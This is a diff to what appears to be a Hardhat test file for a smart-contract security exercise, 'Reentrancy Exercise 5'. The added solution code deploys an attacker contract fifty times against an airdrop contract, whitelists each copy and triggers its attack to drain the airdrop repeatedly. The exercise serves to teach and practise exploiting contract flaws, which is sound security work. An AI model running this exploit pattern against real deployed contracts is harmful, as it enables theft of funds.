@@ -29,6 +29,22 @@ describe("Reentrancy Exercise 5", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR SOLUTION HERE */
+    let ApesAttackFactory = await ethers.getContractFactory(
+      "ApesAttack2",
+      attacker
+    );
+
+    for (let i = 0; i < 50; i++) {
+      this.attack = await ApesAttackFactory.deploy(this.airdrop.address);
+
+      console.log(this.attack.address);
+
+      await this.airdrop
+        .connect(attacker)
+        .grantMyWhitelist(this.attack.address);
+
+      await this.attack.attack();
+    }
 
     /** SOLUTION ENDS HERE */
   });
